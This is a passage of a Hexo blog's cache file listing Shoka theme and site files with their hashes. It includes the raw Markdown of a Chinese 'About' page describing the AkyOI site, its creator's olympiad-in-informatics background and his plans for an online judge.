le/source/_posts/link-post.md","hash":"ac9a280178ba63ccc3acc7540aa96db4d08b5b21","modified":1699091328592},{"_id":"themes/shoka/example/source/_posts/long-title.md","hash":"e11f04c88e453b6b265d634458a69d0124edc684","modified":1699091328593},{"_id":"themes/shoka/example/source/_posts/no-title.md","hash":"24536a15b2a9633d0a4dfad66c0ab51a683d78b5","modified":1699091328594},{"_id":"themes/shoka/example/source/_posts/markdown.md","hash":"7b03cdab8abff7010603ad0e66ef611564e08694","modified":1699091328594},{"_id":"themes/shoka/example/source/_posts/tag-plugins.md","hash":"35e8c2ca9e48d5653f8d69ef05a0221c1b207e4e","modified":1699091328596},{"_id":"themes/shoka/example/source/_posts/tags.md","hash":"788411e01f179f65bc6ea61c73601a0a4a1072d0","modified":1699091328596},{"_id":"themes/shoka/example/source/_posts/videos.md","hash":"32735a9b9f0370d49e0f4311c8bc1fbcfba98445","modified":1699091328596},{"_id":"themes/shoka/example/source/_posts/中文測試.md","hash":"0dd7c0e2e2242939b69dd6d66fe28f56b69ff65a","modified":1699091328596},{"_id":"themes/shoka/example/source/_posts/日本語テスト.md","hash":"5ae9b45f038baa96bd179b4ad0b03409e9a76bdb","modified":1699091328596},{"_id":"themes/shoka/example/source/friends/_data.yml","hash":"1b090bd2f25f4d00471f31c4136141d4ad1ae19a","modified":1699091328608},{"_id":"themes/shoka/example/source/friends/index.md","hash":"c44fdf47aae95588c686a15fa2046ab9a4c09b9b","modified":1699091328609},{"_id":"themes/shoka/layout/_partials/head/head_unique.njk","hash":"afb09eeda0de5dd4df67ba80b58b9ace9eaf5e0d","modified":1699091328616},{"_id":"themes/shoka/layout/_partials/head/head.njk","hash":"91acf8eae82afe770d6f174a37c12b9617b0d97c","modified":1699091328616},{"_id":"themes/shoka/layout/_partials/post/copyright.njk","hash":"b6aa82c28683bdb337920db718841bee207dc2d9","modified":1699091328624},{"_id":"themes/shoka/layout/_partials/sidebar/menu.njk","hash":"14192d78b637ca07ec4a0505268bfaecca2f0680","modified":1699091328627},{"_id":"themes/shoka/layout/_partials/post/footer.njk","hash":"8e7cae0c45bbc2cf3e91eac10ab319caa6b27d2e","modified":1699091328624},{"_id":"themes/shoka/layout/_partials/sidebar/overview.njk","hash":"3c12aa376662f15366177792a35873f2344152b8","modified":1699091328627},{"_id":"themes/shoka/layout/_partials/third-party/baidu-analytics.njk","hash":"9f4568ede657e6844fe54e3cdf9635ecd94b2bf9","modified":1699091328627},{"_id":"themes/shoka/layout/_partials/post/nav.njk","hash":"01e49cc56aa8722f0eb2739ce2e55080429e576e","modified":1699091328625},{"_id":"themes/shoka/layout/_partials/post/reward.njk","hash":"f7185a561288a754beae1323a19c200b99dccd08","modified":1699091328627},{"_id":"themes/shoka/layout/_partials/post/post.njk","hash":"e1846d51aca86c873f1c74152b80d50eec79507b","modified":1699091328626},{"_id":"themes/shoka/source/js/_app/fireworks.js","hash":"e4bf5a9955618bb43020e175e59e497b28c78131","modified":1699091328716},{"_id":"themes/shoka/source/js/_app/dom.js","hash":"1bd152fc94f33793e71cada5ec8bbfd71e531d6c","modified":1699091328716},{"_id":"themes/shoka/source/js/_app/global.js","hash":"a792824837bcf9cb90ec2c831dea2dc4de85cbf1","modified":1699091328716},{"_id":"themes/shoka/source/js/_app/page.js","hash":"d8a51bdd02bc839290df4ea9708a3e1cf39a823a","modified":1699091328716},{"_id":"themes/shoka/source/js/_app/pjax.js","hash":"0528d97ad162eb9f70e21540d993d48e6027ba2d","modified":1699091328716},{"_id":"themes/shoka/source/js/_app/player.js","hash":"d49cc563b239659d554c838f784af8244023f886","modified":1699091328716},{"_id":"themes/shoka/source/js/_app/sidebar.js","hash":"1d532138431e98e28f7579a52b0e88909aba76e0","modified":1699091328716},{"_id":"themes/shoka/source/js/_app/utils.js","hash":"6e123d054bf003deb4fc5eb80cfec233e4941851","modified":1699091328716},{"_id":"themes/shoka/source/css/_common/outline/outline.styl","hash":"e107c799b88278db84a2d5a8819d17f48511f73e","modified":1699091328686},{"_id":"themes/shoka/source/css/_common/outline/mobile.styl","hash":"15c7be9e4e1b3c6b55e7beef5685898ae4f846ab","modified":1699091328686},{"_id":"themes/shoka/source/css/_common/scaffolding/animate.styl","hash":"dda625de5efb0e5b53e81c9da053850e9767da22","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/components/components.styl","hash":"3677ba4471475026d232e3af00d5e6de027151e6","modified":1699091328647},{"_id":"themes/shoka/source/css/_common/scaffolding/base.styl","hash":"415635fa6f145a53a10fa7f0b72247747530f9e7","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/scaffolding/buttons.styl","hash":"555c4b09c9970931e73abe544ae6356cf870670e","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/scaffolding/divider.styl","hash":"faa2e60cafdb0379f66a9ff7f9bd8e4d53551882","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/scaffolding/iconfont.styl","hash":"b3c284f5bf48ae84d4f016779cf43b67c87e0b87","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/scaffolding/normalize.styl","hash":"eea39861e6cb0cdc0e26d2f7878c2059991d3d40","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/scaffolding/scaffolding.styl","hash":"14295140c2e5e50545a9b8404839589d486d78c9","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/scaffolding/ribbon.styl","hash":"e9c99fbd15cb9b118091d6e9add6aaf2abd8ab7d","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/scaffolding/scrollbar.styl","hash":"f34503ae1dce5bfc964d52f3f22601058fc7a907","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/scaffolding/pagination.styl","hash":"80bb3542fb6c7245f9f559c97938a65d29a61784","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/scaffolding/tables.styl","hash":"a67472f2b36047f5f1c2d85e398afe5003e06087","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/scaffolding/tip.styl","hash":"ffdfdc91b9d29060a36bfdf92b746596fd05afd9","modified":1699091328704},{"_id":"themes/shoka/example/source/_posts/computer-science/note/cover.jpg","hash":"6d077a7330284d0fb2b79e96d7e5b56121395df3","modified":1699091328577},{"_id":"themes/shoka/source/css/_common/scaffolding/toggles.styl","hash":"a71d609401001c9b15608d5276636180d49cf844","modified":1699091328704},{"_id":"themes/shoka/example/source/_posts/computer-science/note/theme-shoka-doc.md","hash":"cd2c1d52df850bd7e8cc130bfb19ae6a5fc97f25","modified":1699091328586},{"_id":"themes/shoka/source/css/_common/outline/footer/footer.styl","hash":"66592076afe7b86b7962aac5451e0b5248d7172e","modified":1699091328681},{"_id":"themes/shoka/source/css/_common/outline/header/brand.styl","hash":"6335d84443326d19fff8e17f364d4cace8f19445","modified":1699091328686},{"_id":"themes/shoka/source/css/_common/outline/header/menu.styl","hash":"3b309ade55860b4d8c693b336a33e470436a32b7","modified":1699091328686},{"_id":"themes/shoka/source/css/_common/outline/header/header.styl","hash":"ca7f94ebb0f3090405aab79889b81d4e708a6ab6","modified":1699091328686},{"_id":"themes/shoka/source/css/_common/outline/header/nav.styl","hash":"b267a98cfee639dad82e0889b29ac5bee2634ab6","modified":1699091328686},{"_id":"themes/shoka/source/css/_common/outline/header/image.styl","hash":"0777d91cbc7e228426c46ee97627a32054526013","modified":1699091328686},{"_id":"themes/shoka/source/css/_common/outline/header/right.styl","hash":"d9a7f9923ea7ad2b3aeda9ce7140697f9d094054","modified":1699091328686},{"_id":"themes/shoka/source/css/_common/outline/sidebar/author.styl","hash":"a09b34b35d31a4b8e275bfbb92efa48fe6608d2f","modified":1699091328686},{"_id":"themes/shoka/source/css/_common/outline/header/tool.styl","hash":"1fa043670ba8cc2a4c86081e5dd88e9ed4b1f978","modified":1699091328686},{"_id":"themes/shoka/source/css/_common/outline/header/waves.styl","hash":"f9e6ae9e36429568c0323a112f39d6ea2baaefd6","modified":1699091328686},{"_id":"themes/shoka/source/css/_common/outline/sidebar/menu.styl","hash":"46df47361148673e6c2ce114b4f498be63c0e4ab","modified":1699091328691},{"_id":"themes/shoka/source/css/_common/outline/sidebar/sidebar.styl","hash":"6a1a13ecc6de3ceba1957f95aa852d440abaae9b","modified":1699091328696},{"_id":"themes/shoka/source/css/_common/outline/sidebar/dimmer.styl","hash":"66f159f21cafe1dc71570f7018678a0a3862c175","modified":1699091328691},{"_id":"themes/shoka/source/css/_common/outline/sidebar/related.styl","hash":"e300d2ec33fb7bfbc9310578b8891eb6cd137e86","modified":1699091328694},{"_id":"themes/shoka/source/css/_common/outline/sidebar/social.styl","hash":"33f6459f44e15ef3320e3b208e5345ff1d0cee5f","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/outline/sidebar/state.styl","hash":"c2eaaba4c35df5253ae236318b5e6f76861d37f8","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/components/highlight/highlight.styl","hash":"18be598f5f1d75cb4869adcd1ae47bd19456b2c5","modified":1699091328647},{"_id":"themes/shoka/source/css/_common/outline/sidebar/toc.styl","hash":"5836be92d4d153bd44ff86fe05e0ce83b11ae569","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/outline/sidebar/quick.styl","hash":"01b34ce24ad3dde1147c8f3a6babd70e3d45b461","modified":1699091328692},{"_id":"themes/shoka/source/css/_common/components/highlight/operation.styl","hash":"f2ac0660d8f9e4d4582a4a8c4f97bd6d80162a6d","modified":1699091328647},{"_id":"themes/shoka/source/css/_common/outline/sidebar/tab.styl","hash":"b6f604f7293230d0113dabe5deeb61b809fdf035","modified":1699091328697},{"_id":"themes/shoka/source/css/_common/components/pages/collapse.styl","hash":"a0ecc9afe8c03eae06075fc53c39057e05d22b1e","modified":1699091328647},{"_id":"themes/shoka/source/css/_common/components/pages/home.styl","hash":"95ad71e89df31b58e9db37b4b0c092f2102f91b2","modified":1699091328647},{"_id":"themes/shoka/source/css/_common/components/pages/tag-cloud.styl","hash":"2ebc481064dae0b593e8caff838044f92a5e2ef7","modified":1699091328647},{"_id":"themes/shoka/source/css/_common/components/pages/pages.styl","hash":"e2af0d359247a82dab6f8d6ce90d6b0d5fca4dc9","modified":1699091328647},{"_id":"themes/shoka/source/css/_common/components/post/expand.styl","hash":"ecd24e46405f6e2f08394d7e1e65c86b9294642f","modified":1699091328657},{"_id":"themes/shoka/source/css/_common/components/post/footer.styl","hash":"256f45905d0d1b17d74b6cbfebdc5ef7a107ed83","modified":1699091328658},{"_id":"themes/shoka/source/css/_common/components/post/breadcrumb.styl","hash":"43f7a0d6c7f7bde6a4e521acb67a5b0543a12b77","modified":1699091328647},{"_id":"themes/shoka/source/css/_common/components/post/nav.styl","hash":"7c8f1bf2c755b8c3d1a41eaf1aa6f59d3c23a4a2","modified":1699091328660},{"_id":"themes/shoka/source/css/_common/components/post/copyright.styl","hash":"0a3991a291b53301c6a3f5a86532ea75b8acf355","modified":1699091328656},{"_id":"themes/shoka/source/css/_common/components/post/header.styl","hash":"b1b13db6e10a9b46fbd052dc4db1aa1cfb97ab97","modified":1699091328660},{"_id":"themes/shoka/source/css/_common/components/third-party/loading.styl","hash":"dc513c323ac3555a94e96809d57d09bc4d65fc2b","modified":1699091328666},{"_id":"themes/shoka/source/css/_common/components/post/post.styl","hash":"510d1f7457c2191f8a7bd84ce79cc3c0aade44a8","modified":1699091328660},{"_id":"themes/shoka/source/css/_common/components/post/rtl.styl","hash":"4a431ec0b382ae6693f1aee54599da18eddc6a59","modified":1699091328660},{"_id":"themes/shoka/source/css/_common/components/post/tags.styl","hash":"e3348bf77b141068b91181655945277d6270312b","modified":1699091328666},{"_id":"themes/shoka/source/css/_common/components/third-party/theme.styl","hash":"2d112448cc435b58c57ebd9b31e016e6ae8af5d0","modified":1699091328681},{"_id":"themes/shoka/source/css/_common/components/post/reward.styl","hash":"897a0a0e37ed23ef8ca6c644b3794cf8c32f1650","modified":1699091328660},{"_id":"themes/shoka/source/css/_common/components/third-party/pace.styl","hash":"c93cb3a4715394f8a35db9bb65e03aea8bda45da","modified":1699091328681},{"_id":"themes/shoka/source/css/_common/components/tags/collapse.styl","hash":"aa663a0fcee4138be9a3272172cd30b8118261df","modified":1699091328666},{"_id":"themes/shoka/source/css/_common/components/third-party/third-party.styl","hash":"68ee764bfb8bb0bb478cd41c78895dd341600d26","modified":1699091328681},{"_id":"themes/shoka/source/css/_common/components/third-party/widgets.styl","hash":"71fe298ba9de676ebc3c00febe10784aa7dc119a","modified":1699091328681},{"_id":"themes/shoka/source/css/_common/components/tags/container.styl","hash":"541d71873e36373b671a7cec61ac10db48413d9f","modified":1699091328666},{"_id":"themes/shoka/source/css/_common/components/third-party/valine.styl","hash":"59c69ea7817c0348872f865d406b9650814279ce","modified":1699091328681},{"_id":"themes/shoka/source/css/_common/components/third-party/search.styl","hash":"33b29d3782f058f2b8b89deb3f738fda2517ca4c","modified":1699091328681},{"_id":"themes/shoka/source/css/_common/components/tags/label.styl","hash":"dff26da9be9a7304780941b95d144d03e6b7b19b","modified":1699091328666},{"_id":"themes/shoka/source/css/_common/components/tags/links.styl","hash":"2732062ecaf3a5fec24442bf2fc25de7f4279ff9","modified":1699091328666},{"_id":"themes/shoka/source/css/_common/components/tags/player.styl","hash":"f182dad19b6cc575a1631713a00fd7f0d4516c19","modified":1699091328666},{"_id":"themes/shoka/source/css/_common/components/tags/note.styl","hash":"0eb5410344a0e4506b641689d6835ea8929553e8","modified":1699091328666},{"_id":"themes/shoka/source/css/_common/components/tags/list.styl","hash":"53ceac76fcaa1353cae910e80449810be0cc4254","modified":1699091328666},{"_id":"themes/shoka/example/source/_posts/computer-science/note/theme-shoka-doc/dependents.md","hash":"5048e40092f39f776060e083c822698e5842a3ea","modified":1699091328586},{"_id":"themes/shoka/source/css/_common/components/tags/tags.styl","hash":"b353f2dfc373508d0e0c798bd22107f63591054f","modified":1699091328666},{"_id":"themes/shoka/example/source/_posts/computer-science/note/theme-shoka-doc/config.md","hash":"19c4015857b6953da18628967b7a0b84e624a43d","modified":1699091328586},{"_id":"themes/shoka/source/css/_common/components/tags/tabs.styl","hash":"950cb00307208fbb332119796c4a1ac850f19941","modified":1699091328666},{"_id":"themes/shoka/source/css/_common/components/tags/quiz.styl","hash":"cc0fbb250fdf00887c043e41f0cb777f4f46f992","modified":1699091328666},{"_id":"themes/shoka/example/source/_posts/computer-science/note/theme-shoka-doc/display.md","hash":"fce410e8e5756ea256c6a23ee688455bb8d51e93","modified":1699091328586},{"_id":"themes/shoka/example/source/_posts/computer-science/java/course-1/week-1.md","hash":"8284465659be7a4b7568244264bc236c01a6d1cb","modified":1699091328577},{"_id":"themes/shoka/example/source/_posts/computer-science/java/course-1/cover.jpg","hash":"57341ddf90eeb71d0b9a3fef8cf1f094f9c299b3","modified":1699091328577},{"_id":"themes/shoka/example/source/_posts/computer-science/note/theme-shoka-doc/special.md","hash":"3c0c0bf6b7cd1ab3c12e0d097330937a2803ed10","modified":1699091328586},{"_id":"themes/shoka/example/source/_posts/computer-science/java/course-1/week-2.md","hash":"5efffda6c8abc24a1d4671c54928cfe7fb838ce5","modified":1699091328577},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/flowchart.styl","hash":"83296761c85b8e82d0757b1a4792a74d50509d2d","modified":1699091328666},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/class.styl","hash":"0d9b0d1d2ecf981b881e9416fc770d47f679a50f","modified":1699091328666},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/git.styl","hash":"a7e5f3bb9378b1a4fb0f710e28a02fd4fd1b3040","modified":1699091328674},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/gantt.styl","hash":"bae6617a32026891f510483aa6d25c70a82c5945","modified":1699091328666},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/mermaid.styl","hash":"e54378b88ce839626bdbcb00676d79dbe70a742c","modified":1699091328677},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/sequence.styl","hash":"7e91e07c39e1c1343626c8d5b9fecfebc6c086f6","modified":1699091328681},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/pie.styl","hash":"bce4029a87d60ba40ff4faadb9d95c76b824141a","modified":1699091328681},{"_id":"themes/shoka/source/css/_common/components/third-party/mermaid/state.styl","hash":"83d21d840bd2bc4249e2dced49efe8cef2281f05","modified":1699091328681},{"_id":"themes/shoka/source/images/neuqcsa.jpg","hash":"d73b49a9282c430df76f575d3658c3bc05706ad7","modified":1699064366783},{"_id":"themes/shoka/source/images/buuctf.png","hash":"8e1e619ce53de437c90c9fe2ecc59a8bd27d23b2","modified":1699062955010},{"_id":"themes/shoka/example/source/assets/wallpaper-2572384.jpg","hash":"1df3620ab8c69fe2498a746f8ead057162df0637","modified":1699091328596},{"_id":"themes/shoka/screenshot.png","hash":"676ab8bfe3fa106e5b88617ab377cd6b438cc0d9","modified":1699091328637},{"_id":"themes/shoka/example/source/assets/wallpaper-878514.jpg","hash":"9f9705a377c42320b335b3c66b023e62b80e56e3","modified":1699091328607},{"_id":"themes/shoka/example/source/assets/wallpaper-2311325.jpg","hash":"ddaaaeb4fa04a05c83053c1f8149720d18c9c8de","modified":1699091328596},{"_id":"public/about/index.html","hash":"6d05e082f34cedbfc58dfb37c93e81bce85732ab","modified":1699095358903},{"_id":"public/links/index.html","hash":"ee6a6e94006c12e7ea3ce4c93afe0efdc9317141","modified":1699095358903},{"_id":"public/2023/11/04/NEUQCSA/NEUQCSA-10月月赛题解/index.html","hash":"0954ca17dce278c7bdf6da895bc6cc536722d6c3","modified":1699095358903},{"_id":"public/2023/11/04/Pwn/hello-world/index.html","hash":"4de91243e7adb37da67f669ed46d2f4f9088fa8b","modified":1699095358903},{"_id":"public/categories/index.html","hash":"0bf9409d52dc354960130a026174e7d67f62d938","modified":1699095358903},{"_id":"public/tags/index.html","hash":"820bc858b830acf0a04aafa91b71f1b22eadfabf","modified":1699095358903},{"_id":"public/404.html","hash":"c58fa960461d80c17add0432cfa97f7d3fac131e","modified":1699095358903},{"_id":"public/js/app.js","hash":"b68a06a99d3668968d3c37ae7336f7e31fa40ed2","modified":1699095358903},{"_id":"public/images/3.png","hash":"7ef6ae05f932ef12ff59a8a691c6d3893357a014","modified":1699092845035},{"_id":"public/images/1avatar.jpg","hash":"93af0fd2ee6322c5c77760eefba6c81afa2e313e","modified":1699092845035},{"_id":"public/images/1.png","hash":"778c1976242a14ddc1035fbcd27ab8c96caace42","modified":1699092845035},{"_id":"public/images/404.png","hash":"b7b18f6689d0a14041d87bab6c4e4ce567249d01","modified":1699092845035},{"_id":"public/images/2.png","hash":"d9f849ffab8ae29c4dc171845e9071dec300cbaf","modified":1699092845035},{"_id":"public/images/algolia_logo.svg","hash":"45eeea0b5fba833e21e38ea10ed5ab385ceb4f01","modified":1699092845035},{"_id":"public/images/alipay.png","hash":"013436bac325a3a0c2c9b13a08312fc4e7025d69","modified":1699092845035},{"_id":"public/images/apple-touch-icon.png","hash":"d4e5d65ff663cb71f43515e68d757cbae1ceb3ec","modified":1699092845035},{"_id":"public/images/favicon.ico","hash":"8ae48d9e33b7593cd005aae88b755aa9ce129f0e","modified":1699092845035},{"_id":"public/images/failure.ico","hash":"5eec5c163400d8ece74286da49130da1ead3f6f6","modified":1699092845035},{"_id":"public/images/avatar.jpg","hash":"0ad882e3e2715848e51339ce3d9ad187c34d594f","modified":1699092845035},{"_id":"public/images/logo.svg","hash":"830dfbd6dff2986130819f747b25db230b05ca84","modified":1699092845035},{"_id":"public/images/luogu.png","hash":"9f48a8710627a76d8a9a7a1a6494fcb6f7742966","modified":1699092845035},{"_id":"public/images/paypal.png","hash":"872d4b6d3cacee4845246fbf29817f1ee98bb037","modified":1699092845035},{"_id":"public/images/play_needle.png","hash":"e0998828ab50ce37617f9f4d46b74648206ac852","modified":1699092845035},{"_id":"public/images/search.png","hash":"08c4f6a7a92eff3548aec94b267a23a25e6bd215","modified":1699092845035},{"_id":"public/images/play_disc.png","hash":"3cfa8dd2e12424c52d1f5e34e9502e446fecde9c","modified":1699092845035},{"_id":"public/images/wechatpay.png","hash":"470a42ee16dd516580d5e51607f11dc353a49675","modified":1699092845035},{"_id":"public/images/neuqcsa.jpg","hash":"d73b49a9282c430df76f575d3658c3bc05706ad7","modified":1699092845035},{"_id":"public/css/comment.css","hash":"803798f6bb1436a440f3adc0ed96a802c0394dbb","modified":1699092845035},{"_id":"public/css/mermaid.css","hash":"9f1a4974e64da87f4ecca29e66539c7225c083be","modified":1699092845035},{"_id":"public/css/app.css","hash":"d5bb166cebef07ba4b54a6b04755e2506484595c","modified":1699092845035},{"_id":"public/images/buuctf.png","hash":"8e1e619ce53de437c90c9fe2ecc59a8bd27d23b2","modified":1699092845035},{"_id":"public/NEUQCSA/cover.jpg","hash":"339fffe4b7ae6e8a3b17f04cbf37fc34d42a6fc7","modified":1699092845035}],"Category":[{"name":"NEUQCSA","_id":"clojpbdik0002z0ai9tgjhwtr"}],"Data":[],"Page":[{"_content":"{% links %}\n- site: AkyOI\n  owner: AkyOI\n  url: http://39.107.55.74\n  desc: Latest-Version #简短描述\n  image: images/avatar.jpg\n  color: \"#d0ccf7\" #颜色代码\n{% endlinks %}\n[Updated 2023/11/4]{.lable .primary}\n# 关于AkyOI\nAkyO之前是在GitHubPage，现在正式开始开发基于云服务器和hexo的Page，此外，还打算继续搭建一些OJ等，实现高中时期画的大饼。\n!!我也不知道该说些什么!!\n\n- [ ] 搭建OJ\n- [x] 让Blog更加美观、!!!更加二次元!!{.bulr}\n{.primary}\n:::info\noi!!! 以下是Copy的Legacy网页内容。\n:::\n[:broken_heart:某些功能不再使用，请前往原网站查看。]{.label .danger}\n{% links %}\n- site: About-AkyOI（Legacy） #站点名称\n  owner: Zchared #管理员名字\n  url: https://akyoi.akyuu.space/About/ #站点网址\n  desc: Stable-Version (Legacy) #简短描述\n  image: images/avatar.jpg #一张图片\n  color: \"#d0ccf7\" #颜色代码\n{% endlinks %}\n#关于AkyOI\nAkyOI,由Zchared创始并且开发。目前此人很神秘，应该没人知道他叫啥。（车万人，不是原神厨。）\nApril 17, 2022，Zchared在Github上创建了此代码库，并且着手开发此Github Page。2022/7/1，此Github Page的开发接近尾声，但是OnlineJudge和Offline Judge还没有落实。\n其实此GitHubPage原来是想命名为FzOI的，但是FengXian中学的所作所为让Zchared放弃了这个想法，他认为他自己辛苦敲出来的Page为啥要给这个对OI有偏见的学校。因此改名为ZcOI\n之后，身为一名车万人，他想到了稗田阿求（Hieda no Akyuu）,脑子来了灵感，就把这个Page命名为AkyOI，寓意就是：\n像稗田阿求一样，世世代代记录着OI的事情。\n（最重要的一点，就是OIer和稗田阿求一样都是人类，没有博丽灵梦和幽幽子等人的能力，而且都是寿命论的受害者，因此希望OIer们都能像稗田阿求一样珍惜仅存的生命）\n顺便提一下，此GitHubpage的号，只是个小号。\n\n\n#关于Zchared\nZchared,不知道他叫啥。只知道...\n（不信你去看他QQ：3433778745，主页上全是稗田阿求（现在还有一只绯想天桃子） /*除了他那几张用来显摆的OI证书*/\n（他2022年下半年就要退役OI了，希望他可以完成他的愿望：NOIP一等奖） Update 2022/12/13 : 事实上高三他拿了国二，离国一差8分。。。当时T4有八分很容易拿，他很可惜没得到。（他其实都没考虑做T4\n\nQ:他为什么搞OI啊？？？\nA：初二的时候他开始对计算机科学产生了兴趣。无数次的偶然中，他在初二自学了C/C++，而没有学其他的语言，但是仍然作为一个兴趣。他当时并不知道有个东西叫做OI。\n之后，他再高一开学前接触到了数学，物理，化学，生物\n```\n等\n```\n奥林匹克竞赛中的信息学竞赛\n（你不需要知道为啥这里为啥突出“等”）\nZchared本人的话：“...来来来！全体目光向我看齐！我郑重宣布个事：我 就 是 歌 姬...（呸！）！ 我是个正常人！” ”\n\nQ:OI好学吗\nA:好学，就是不会用。基础知识是正经大学本科的基础，算法跟数据结构就是小于大学竞赛的难度，大于大学本科的难度。\n\n......\n\n\n#关于稗田阿求\n\n不多说，上链接\n稗田阿求-THBWiki\n\n\n#Others\n重申一下，此Page建设的目的，就是帮助OIer们能够更加轻松的去学习OI，少走弯路，一年级上国一，二年级NOI金牌，三年级AK IOI，四年级AK ICPC，走上人生巅峰！\n本Page与任何中学，任何机构没有任何关系，纯粹为爱发电。不喜勿喷。\n背景-pixiv:71925485\n\n#本Page目前的遗憾（Legacy）\nUpdate 2022/7/1\n移动端适配没有解决。建议使用分辨率1080p的屏幕进行浏览。\n鸽了，离今年的CSP仅剩77天了，等高中毕业再继续开发这些功能吧。毕竟我看ybt的网站适配也不咋地。再说了，不会真有人搞OI用手机吧。除了主页，其他页面勉强能用。\nOnlineJudge目前只是个猜想，用JavaScript去模拟阅读理解源代码，从而模拟编译运行的效果，但是似乎Time和Memory的limits似乎无法进行Judge。\nOfflineJudge目前开发了一半，等我高中毕业再开发吧。Offline的Judge最核心还是实现一个类似于对拍的效果，只不过是直接将运行结果与.ans文件进行对比。实现也很简单，考场上都能写出来。目前最大的瓶颈就是没有服务器。。。。。。Submit也是个大问题。\n短期来看，实现Judge基本是不大可能的。\n就算实现了，也仅仅只是offline的Judge，Ranking是很麻烦的。\n如果有大佬有好想法的话，不妨分享一下。我先鸽了。\n\n\n\n\n\n\n你不觉得显示的东西少了亿点点吗？？？身为一名OIer，不会真有人没读过源代码吧，不会吧，不会吧~\n\n\n\n更新记录：\n\n>> 2022/7/1 创建了这个页面，写了一堆东西\n>> 2022/8/1 进行了亿些修改，添加了一些好玩的东西，开始玩梗（114514 1919810）\n>> 2022/12/14 进行了UI的修改，至少看起来不那么扎眼了\n>> 2023/8/24 UI添加了一些动画；开设CTF板块，更新CTF学习内容；具体内容目录将以tree的形式呈现；添加了Sidebar，同时优化了代码，更方便维护；修改了一些BUG（绝对是大更新）\n\n\n\nAkyOI ~ 2023 | By Zchared","source":"about/index.md","raw":"{% links %}\n- site: AkyOI\n  owner: AkyOI\n  url: http://39.107.55.74\n  desc: Latest-Version #简短描述\n  image: images/avatar.jpg\n  color: \"#d0ccf7\" #颜色代码\n{% endlinks %}\n[Updated 2023/11/4]{.lable .primary}\n# 关于AkyOI\nAkyO之前是在GitHubPage，现在正式开始开发基于云服务器和hexo的Page，此外，还打算继续搭建一些OJ等，实现高中时期画的大饼。\n!!我也不知道该说些什么!!\n\n- [ ] 搭建OJ\n- [x] 让Blog更加美观、!!!更加二次元!!{.bulr}\n{.primary}\n:::info\noi!!! 以下是Copy的Legacy网页内容。\n:::\n[:broken_heart:某些功能不再使用，请前往原网站查看。]{.label .danger}\n{% links %}\n- site: About-AkyOI（Legacy） #站点名称\n  owner: Zchared #管理员名字\n  url: https://akyoi.akyuu.space/About/ #站点网址\n  desc: Stable-Version (Legacy) #简短描述\n  image: images/avatar.jpg #一张图片\n  color: \"#d0ccf7\" #颜色代码\n{% endlinks %}\n#关于AkyOI\nAkyOI,由Zchared创始并且开发。目前此人很神秘，应该没人知道他叫啥。（车万人，不是原神厨。）\nApril 17, 2022，Zchared在Github上创建了此代码库，并且着手开发此Github Page。2022/7/1，此Github Page的开发接近尾声，但是OnlineJudge和Offline Judge还没有落实。\n其实此GitHubPage原来是想命名为FzOI的，但是FengXian中学的所作所为让Zchared放弃了这个想法，他认为他自己辛苦敲出来的Page为啥要给这个对OI有偏见的学校。因此改名为ZcOI\n之后，身为一名车万人，他想到了稗田阿求（Hieda no Akyuu）,脑子来了灵感，就把这个Page命名为AkyOI，寓意就是：\n像稗田阿求一样，世世代代记录着OI的事情。\n（最重要的一点，就是OIer和稗田阿求一样都是人类，没有博丽灵梦和幽幽子等人的能力，而且都是寿命论的受害者，因此希望OIer们都能像稗田阿求一样珍惜仅存的生命）\n顺便提一下，此GitHubpage的号，只是个小号。\n\n\n#关于Zchared\nZchared,不知道他叫啥。只知道...\n（不信你去看他QQ：3433778745，主页上全是稗田阿求（现在还有一只绯想天桃子） /*除了他那几张用来显摆的OI证书*/\n（他2022年下半年就要退役OI了，希望他可以完成他的愿望：NOIP一等奖） Update 2022/12/13 : 事实上高三他拿了国二，离国一差8分。。。当时T4有八分很容易拿，他很可惜没得到。（他其实都没考虑做T4\n\nQ:他为什么搞OI啊？？？\nA：初二的时候他开始对计算机科学产生了兴趣。无数次的偶然中，他在初二自学了C/C++，而没有学其他的语言，但是仍然作为一个兴趣。他当时并不知道有个东西叫做OI。\n之后，他再高一开学前接触到了数学，物理，化学，生物\n```\n等\n```\n奥林匹克竞赛中的信息学竞赛\n（你不需要知道为啥这里为啥突出“等”）\nZchared本人的话：“...来来来！全体目光向我看齐！我郑重宣布个事：我 就 是 歌 姬...（呸！）！ 我是个正常人！” ”\n\nQ:OI好学吗\nA:好学，就是不会用。基础知识是正经大学本科的基础，算法跟数据结构就是小于大学竞赛的难度，大于大学本科的难度。\n\n......\n\n\n#关于稗田阿求\n\n不多说，上链接\n稗田阿求-THBWiki\n\n\n#Others\n重申一下，此Page建设的目的，就是帮助OIer们能够更加轻松的去学习OI，少走弯路，一年级上国一，二年级NOI金牌，三年级AK IOI，四年级AK ICPC，走上人生巅峰！\n本Page与任何中学，任何机构没有任何关系，纯粹为爱发电。不喜勿喷。\n背景-pixiv:71925485\n\n#本Page目前的遗憾（Legacy）\nUpdate 